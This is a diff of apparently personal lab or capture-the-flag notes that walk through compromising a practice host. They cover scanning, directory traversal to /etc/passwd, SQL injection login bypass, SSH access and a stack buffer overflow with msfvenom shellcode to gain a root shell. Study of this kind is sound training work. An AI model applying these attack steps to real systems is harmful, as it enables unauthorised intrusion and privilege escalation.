@@ -1,4 +1,90 @@
+STEP 1
+- Scan your given IP using nmap
+- nmap -sV 10.50.18.3 -T5
+- You see the open ports such as 22, 80, and 53
+- Now we can just put the ip in browser to see the web server.
+- We can also run the http Enum Script to see what files we can use with the browser. (nmap -Pn -T5 --script http-enum.nse 10.50.18.3 -p 8)
+- Look at the files given and see what info you can gather.
+- When looking at the 10.50.18.3/getcareers.php?myfile=      we can take note that it is looking for a file. So we can use directory traversal to read ither files. (EX: ../../../../etc/passwd)
+- Keep surfing through the web browser. You can find emails and locations.
+- once I came across the login.php page --> went to the login.html --> opened inspector --> did my 'OR 1='1 login --> collected the post request --> went back to login.php --> added a question mark --> pasted the rest of the link and got the logins.
+- noticed the creds were encoded --> we can use the admin.php page to decode those strings in the box where it says "Decode String".
+- if you analyze all of the given links from the http-enum script there are various ways to get passwords. One way is to go to /scripts and you also get creds for user2 from that.
+
+STEP 2
+- After getting credentials and various other enumeration we can go ahead and try an SSH.
+- We are going to SSH into the user2 using the creds we found in the /scripts.
+- Another method to get the creds for this box is by inserting an ssh key into the admin page.
+- ssh -MS /tmp/jmp user2@10.50.18.3 
+- sudo -l ; this shows us commands we can run as root --> from this we notice the /var/tmp/exploit_me --> this is obvious.
+- We can also find this by just searching around in the box
+- After we find this executable we should run strings on it for further enumeration
+- Once we go through strings we can also run the executable to see what happens.
+- ./exploit_me                   (this is running it)
+- ./exploit_me $(echo 12345)      (this is seeing for parameters)    !!! IN THIS CASE THIS ONE WORKS
+-  ./exploit_me <<<$(echo 12345)    (this is seeing for user input)
+- now we can start building our python script to exploit this executable
+
+
+STEP 3
 Exploit Development on Dry Run issues
+
+- shebang --> (#!/usr/bin/python)
+- first build offset --> offset -"A" * 100
+- Print --> print(offset)
+- Save this and run it
+- ./exploit_me $(python linbuf.py)
+- This gives you "Segmentation Fault" meaning you sucessfully broke it
+- now go to wiremask and set your "Length" equal to the same thing you set your offset as at the beginning.
+- take that long ass Pattern from wire mask and paste it into your script.
+- (ex: offset = Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A)
+- now go to gdb
+- file ./exploit_me
+- run $(python linbuf.py)
+- This will now give you another segmentation fault --> now with a new value that you can put into wiremask.
+- After putting this into wiremask you can get your offset value.
+- Now take that new offset and put it into your script. replacing the old one 
+- offset = "A" * 55
+- now go back into gdb
+- type shell
+- env - gdb ./exploit_me
+- unset env LINES
+- unset env COLUMNS
+- start
+- info proc map
+- step
+- info proc map
+- step info proc map
+- up until you get heap and stack values
+- then you take the first address after heap and the last address with stack
+- run the following commands in gdb
+- find /b <1st addr after heap>,<to the end of stack>, 0xff, 0xe4
+- find /b 0xf7de1000,0xffffe000,0xff,0xe4
+- this will give you your eip value.
+- take not of first five but put the first one into little endian and this one will become your EIP value
+- \x59\xfb\xde\xf7
+- then put this into your script --> eip = "\x59\xfb\xde\xf7"
+- now change print line --> print(offset + eip)
+- now add nop sled --> nop = "\x90" * 15
+- now change print again --> print(offset + eip + nop)
+- now go into new linops terminal and run the command you wanna put in there.
+- these were two good ones that I used 
+- msfvenom -p linux/x86/exec CMD="su root" -b "\x00\fe\x20\x0a\xff" -f python                         (this one allowed me to switch my user to root. and gave me a root shell)
+- msfvenom -p linux/x86/exec CMD="cat /root/secret_msg.txt" -b "\x00\fe\x20\x0a\xff" -f python        (this one just catted the file that we needed and gave me the message)
+- take the buf value from the result of running this command
+- go back to our script and past it
+- now change print statment again 
+- print(offset + eip + nop + buf)
+- now go back to user2/target shell and run the script
+- sudo ./exploit_me $(python linbuf.py)
+- or just try ./exploit_me $(python linbuf.py)
+
+
+
+
+
+
+
 
   - made a new script on the target box in this case www-data
   - set my bin bash
@@ -22,7 +108,7 @@ Exploit Development on Dry Run issues
 - info proc map
 - until you find heap and stack (1st addy after heap and last addy after stack)
 - still in gdb
--find /b <1st addr after heap>,<to the end of stack>, 0xff, 0xe4
+- find /b <1st addr after heap>,<to the end of stack>, 0xff, 0xe4
 - find /b 0xf7de1000,0xffffe000,0xff,0xe4
 - keep mind of first five addresses but take the first one and turn it to little endian. 0xf7defb59 --> \x59\xfb\xde\xf7
 -  in new linops term run your msfvenom command. 
@@ -101,3 +187,16 @@ from <URL>/pick.php?product=7 UNION SELECT user_id,name,username FROM siteusers.
 - 
 
 
+
+
+
+
+
+
+
+
+
+
+
+notable mentions that you should consider:
+Passwd.txt Passwds.txt passwd.txt password.txt passwords.txt 
